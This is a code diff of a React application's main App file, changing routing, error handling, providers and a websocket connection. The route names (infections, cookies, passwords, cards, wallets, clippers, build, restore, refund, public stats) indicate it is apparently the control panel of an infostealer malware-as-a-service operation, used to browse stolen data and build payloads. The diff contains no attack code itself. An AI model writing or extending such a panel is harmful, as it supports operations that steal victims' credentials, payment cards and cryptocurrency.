@@ -3,6 +3,7 @@ import { createBrowserRouter, RouterProvider, Navigate } from 'react-router-dom'
 import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
 import { AuthProvider, useAuth } from '@/hooks/use-auth'
 import { ThemeProvider } from '@/lib/theme-provider'
+import { I18nProvider } from '@/lib/i18n'
 import { Shell } from '@/components/layout/shell'
 import { wsClient } from '@/lib/ws'
 import Login from '@/pages/Login'
@@ -18,47 +19,22 @@ import RestorePage from '@/pages/Restore'
 import DocsPage from '@/pages/DocsPage'
 import PublicStatsPage from '@/pages/PublicStatsPage'
 import RefundPolicy from '@/pages/RefundPolicy'
+import ApiKeysPage from '@/pages/ApiKeysPage'
+import SupportPage from '@/pages/SupportPage'
 
 class ErrorBoundary extends Component<{ children: ReactNode }, { hasError: boolean }> {
-  constructor(props: { children: ReactNode }) {
-    super(props)
-    this.state = { hasError: false }
-  }
-
-  static getDerivedStateFromError() {
-    return { hasError: true }
-  }
-
+  constructor(props: { children: ReactNode }) { super(props); this.state = { hasError: false } }
+  static getDerivedStateFromError() { return { hasError: true } }
   render() {
     if (this.state.hasError) {
-      return (
-        <div className="min-h-screen flex items-center justify-center bg-background">
-          <div className="text-center space-y-4">
-            <h1 className="text-2xl font-bold">Something went wrong</h1>
-            <p className="text-muted-foreground">
-              An unexpected error occurred. Please refresh the page.
-            </p>
-            <button
-              onClick={() => { this.setState({ hasError: false }); window.location.reload() }}
-              className="px-4 py-2 bg-primary text-primary-foreground rounded-md text-sm"
-            >
-              Reload
-            </button>
-          </div>
-        </div>
-      )
+      return <div className="flex items-center justify-center h-screen"><p className="text-sm text-muted-foreground">{/* i18n: error.something_wrong */}Something went wrong.</p></div>
     }
     return this.props.children
   }
 }
 
 const queryClient = new QueryClient({
-  defaultOptions: {
-    queries: {
-      retry: 1,
-      refetchOnWindowFocus: false,
-    },
-  },
+  defaultOptions: { queries: { retry: 1, refetchOnWindowFocus: false, staleTime: 10_000 } },
 })
 
 function ProtectedRoute({ children }: { children: React.ReactNode }) {
@@ -66,27 +42,26 @@ function ProtectedRoute({ children }: { children: React.ReactNode }) {
   const connectedRef = useRef(false)
 
   useEffect(() => {
-    const token = localStorage.getItem('token')
-    if (isAuthenticated && token && !connectedRef.current) {
-      connectedRef.current = true
-      wsClient.connect(token)
+    if (isAuthenticated && !connectedRef.current) {
+      const token = localStorage.getItem('token')
+      if (token) { wsClient.connect(token); connectedRef.current = true }
     }
-    return () => {
-      if (connectedRef.current) {
-        wsClient.disconnect()
-      }
-    }
-  }, [])
+    return () => { if (connectedRef.current) { wsClient.disconnect(); connectedRef.current = false } }
+  }, [isAuthenticated])
 
-  if (isLoading) return <div>Loading...</div>
+  if (isLoading) return <div className="flex items-center justify-center h-screen"><div className="h-6 w-6 border-2 border-primary border-t-transparent rounded-full animate-spin" /></div>
   if (!isAuthenticated) return <Navigate to="/login" replace />
   return <>{children}</>
+}
+
+function NotFound() {
+  return <div className="flex flex-col items-center justify-center h-[60vh] gap-4"><h1 className="text-4xl font-bold">404</h1><p className="text-muted-foreground">Page not found</p></div>
 }
 
 const router = createBrowserRouter([
   { path: '/login', element: <Login /> },
   { path: '/public', element: <PublicStatsPage /> },
-  { path: '/refund-policy', element: <RefundPolicy /> },
+  { path: '/refund', element: <RefundPolicy /> },
   {
     path: '/',
     element: <ProtectedRoute><Shell /></ProtectedRoute>,
@@ -94,40 +69,42 @@ const router = createBrowserRouter([
       { index: true, element: <Dashboard /> },
       { path: 'sessions', element: <Sessions /> },
       { path: 'sessions/:id', element: <SessionDetail /> },
-      { path: 'build', element: <BuildPage /> },
+      // Category routes — Sessions reads the URL path to filter by type
+      { path: 'infections', element: <Sessions /> },
+      { path: 'cookies', element: <Sessions /> },
+      { path: 'passwords', element: <Sessions /> },
+      { path: 'cards', element: <Sessions /> },
+      { path: 'wallets', element: <Sessions /> },
+      { path: 'files', element: <Sessions /> },
+      { path: 'clippers', element: <Sessions /> },
+      { path: 'tasks', element: <Sessions /> },
       { path: 'search', element: <SearchPage /> },
+      { path: 'build', element: <BuildPage /> },
+      { path: 'restore', element: <RestorePage /> },
+      { path: 'docs', element: <DocsPage /> },
+      { path: 'docs/*', element: <DocsPage /> },
       { path: 'users', element: <UsersPage /> },
       { path: 'team', element: <TeamPage /> },
-      { path: 'restore', element: <RestorePage /> },
       { path: 'settings', element: <Settings /> },
-      { path: 'docs', element: <DocsPage /> },
-      { path: 'docs/:path', element: <DocsPage /> },
+      { path: 'api-keys', element: <ApiKeysPage /> },
+      { path: 'support', element: <SupportPage /> },
       { path: '*', element: <NotFound /> },
     ],
   },
 ])
 
-function NotFound() {
-  return (
-    <div className="flex items-center justify-center h-64">
-      <div className="text-center space-y-3">
-        <h1 className="text-4xl font-bold text-muted-foreground">404</h1>
-        <p className="text-sm text-muted-foreground">Page not found</p>
-      </div>
-    </div>
-  )
-}
-
 export default function App() {
   return (
-    <ThemeProvider>
+    <ErrorBoundary>
       <QueryClientProvider client={queryClient}>
-        <AuthProvider>
-          <ErrorBoundary>
+        <ThemeProvider>
+          <I18nProvider>
+          <AuthProvider>
             <RouterProvider router={router} />
-          </ErrorBoundary>
-        </AuthProvider>
+          </AuthProvider>
+          </I18nProvider>
+        </ThemeProvider>
       </QueryClientProvider>
-    </ThemeProvider>
+    </ErrorBoundary>
   )
 }
